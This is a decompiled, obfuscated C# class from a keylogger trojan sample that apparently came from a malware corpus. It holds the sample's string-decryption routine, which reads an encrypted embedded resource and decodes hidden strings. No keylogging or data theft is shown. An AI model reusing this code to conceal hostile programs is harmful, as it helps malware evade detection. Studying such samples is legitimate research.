// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ctfmon, Version=6.0.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 2B1874D2-B5D6-4FC2-9C40-41C2D3A7E9B2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Spy.MSIL.KeyLogger.bxxf-29d0d8bb086c7360de2cb6bdee6fa1f914777123fb768702327d93adc7e2d1c9.exe

using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0003
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0001.\u0002 \u0001;
    private static string \u0001;
    private static string \u0002;
    private static byte[] \u0001;
    private static Hashtable \u0001;
    private static bool \u0001;
    private static int \u0001;

    public static string \u0002([In] int obj0)
    {
      obj0 -= \u0003.\u0002.\u0001;
      if (\u0003.\u0002.\u0001)
      {
        string str = (string) \u0099.\u007E\u0089\u0003((object) \u0003.\u0002.\u0001, (object) obj0);
        if (str != null)
          return str;
      }
      int num1 = obj0;
      byte[] numArray1 = \u0003.\u0002.\u0001;
      int index1 = num1;
      int num2 = index1 + 1;
      int num3 = (int) numArray1[index1];
      int num4;
      if ((num3 & 128) == 0)
      {
        num4 = num3;
        if (num4 == 0)
          return string.Empty;
      }
      else if ((num3 & 64) == 0)
      {
        num4 = ((num3 & 63) << 8) + (int) \u0003.\u0002.\u0001[num2++];
      }
      else
      {
        int num5 = (num3 & 31) << 24;
        byte[] numArray2 = \u0003.\u0002.\u0001;
        int index2 = num2;
        int num6 = index2 + 1;
        int num7 = (int) numArray2[index2] << 16;
        int num8 = num5 + num7;
        byte[] numArray3 = \u0003.\u0002.\u0001;
        int index3 = num6;
        int num9 = index3 + 1;
        int num10 = (int) numArray3[index3] << 8;
        int num11 = num8 + num10;
        byte[] numArray4 = \u0003.\u0002.\u0001;
        int index4 = num9;
        num2 = index4 + 1;
        int num12 = (int) numArray4[index4];
        num4 = num11 + num12;
      }
      try
      {
        byte[] numArray5 = \u008E.\u009C\u0002(\u0091.\u007E\u0013\u0004((object) \u0013\u0002.\u0014\u0004(), \u0003.\u0002.\u0001, num2, num4));
        string str = \u009A\u0002.\u008F\u0002(\u0091.\u007E\u0013\u0004((object) \u0013\u0002.\u0014\u0004(), numArray5, 0, numArray5.Length));
        if (\u0003.\u0002.\u0001)
        {
          try
          {
            \u0091\u0002.\u007E\u0087\u0003((object) \u0003.\u0002.\u0001, (object) obj0, (object) str);
          }
          catch
          {
          }
        }
        return str;
      }
      catch
      {
        return (string) null;
      }
    }

    static \u0002()
    {
      \u0001.\u0003.\u0002();
      \u0003.\u0002.\u0001 = "0";
      \u0003.\u0002.\u0002 = "74";
      \u0003.\u0002.\u0001 = (byte[]) null;
      \u0003.\u0002.\u0001 = (Hashtable) null;
      \u0003.\u0002.\u0001 = false;
      \u0003.\u0002.\u0001 = 0;
      if (\u0095\u0002.\u0082\u0002(\u0003.\u0002.\u0001, "1"))
      {
        \u0003.\u0002.\u0001 = true;
        \u0003.\u0002.\u0001 = new Hashtable();
      }
      \u0003.\u0002.\u0001 = \u0006\u0002.\u009B\u0002(\u0003.\u0002.\u0002);
      Assembly assembly = \u009F\u0002.\u009E\u0003();
      Stream stream = \u0006\u0003.\u007E\u009C\u0003((object) assembly, "{2b1874d2-b5d6-4fc2-9c40-41c2d3a7e9b2}");
      try
      {
        int length = \u009F.\u009A\u0002(\u0090\u0002.\u007E\u001B\u0004((object) stream));
        byte[] numArray = new byte[length];
        int num = \u007F\u0003.\u007E\u001E\u0004((object) stream, numArray, 0, length);
        \u0003.\u0002.\u0001 = \u0002.\u0003.\u0002(numArray);
        \u0010\u0002.\u007E\u001D\u0004((object) stream);
      }
      finally
      {
        if (stream != null)
          \u0010\u0002.\u007E\u0080\u0002((object) stream);
      }
    }
  }
}
